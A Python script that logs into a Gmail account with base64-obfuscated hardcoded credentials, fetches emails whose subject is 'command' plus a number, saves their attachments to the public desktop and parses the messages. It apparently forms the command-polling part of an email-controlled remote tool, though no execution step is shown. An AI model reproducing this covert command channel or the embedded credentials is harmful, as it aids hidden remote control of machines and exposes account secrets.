import smtplib
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import imaplib
import re
import time
import subprocess
import pyautogui
import email
import os

def reader(ii):
    email_user = base64.b64decode('dXBkYXRvcnNAZ21haWwuY29t').decode('utf-8')
    email_pass = base64.b64decode('dXBkYXRvcnNzc3M=').decode('utf-8')
    M = imaplib.IMAP4_SSL('imap.gmail.com', 993)
    M.login(email_user, email_pass)
    _,totalmsg=(M.select('INBOX'))
    subj='command'+str(ii)
    typ, message_numbers = M.search(None, 'SUBJECT {subj}'.format(subj=subj))#FROM "anish.dhakal.ad.ad15@gmail.com"
    raw=[]
    for num in message_numbers[0].split():
        typ, data = M.fetch(num, '(RFC822)')
        data=data[0][1].decode('utf-8')
        email_message = email.message_from_string(data)
        for part in email_message.walk():
            stri=""
        # this part comes from the snipped I don't understand yet... 
            if part.get_content_maintype() == 'multipart':
                b = email.message_from_string(data)
                aa=""
                for payload in b.get_payload():
                    aa=payload.get_payload()
                body=aa
                fro=b['From']
                subject=b['Subject']
                try:
                    start=re.search('<div dir="ltr">',body).end()
                    end=re.search('</div>\r\n',body).start()
                    body=body[start:end]
                    stri+='Body: '+body+" ::: "
                    stri+='From: '+fro+" ::: "
                    stri+='Subject: '+subject+" ::::::"
                    raw.append(stri)
                    
                except:
                    body=body
            if part.get('Content-Disposition') is None:
                continue
            fileName = part.get_filename()
            
            if bool(fileName):
                filePath = os.path.join(r'c:\Users\Public\Desktop', fileName)
                if not os.path.isfile(filePath) :
                    fp = open(filePath, 'wb')
                    fp.write(part.get_payload(decode=True))
                    fp.close()
                subject = str(email_message).split("Subject: ", 1)[1].split("\nTo:", 1)[0]
                body=filePath
            stri+='Body: '+body+" ::: "
            stri+='From: '+fro+" ::: "
            stri+='Subject: '+subject+" ::::::"
            raw.append(stri)
            
                
    M.close()
    M.logout()
    return raw
def fechdata(no,fecher):
    temp=[]
    if fecher=="slist" and no=="NULL":
        for value in data:
            start=(re.search(' ::: From: ',value)).end()
            end=(re.search(' ::: Subject: ',value)).start()
            temp.append(value[start:end])
    elif fecher=="sublist" and no=="NULL":
        for value in data:
            start=(re.search('> ::: Subject: ',value)).end()
            end=(re.search(' ::::::',value)).start()
            temp.append(value[start:end])
            
    elif fecher=="sname" and no!="NULL":
        value=data[(int(no)-1)]
        raw=""
        start=(re.search(' ::: From: ',value)).end()
        end=(re.search(' ::: Subject: ',value)).start()
        raw=value[start:end]
        end=(re.search(' <',raw)).end()
        return(raw[:(end-2)].encode('ascii'))
    elif fecher=="semail" and no!="NULL":
        value=data[(int(no)-1)]
        raw=""
        start=(re.search(' ::: From: ',value)).end()
        end=(re.search(' ::: Subject: ',value)).start()
        raw=value[start:end]
        start=(re.search(' <',raw)).end()
        r=(raw[start:])
        return(r[:(len(r)-1)])
    elif fecher=="body" and no!="NULL":
        value=data[(int(no)-1)]
        start=(re.search('Body: ',value)).end()
        end=(re.search(' ::: From:',value)).start()
        return(value[start:end])
        
    elif fecher=="sublist" and no!="NULL":
        value=data[(int(no)-1)]
        start=(re.search(' ::: Subject: ',value)).end()
        end=(re.search(' ::::::',value)).start()
        return(value[start:end])
    else:
               return "NULL"
    return temp
    

        

data=reader(3)
print(data)
print(fechdata(1,'body'))


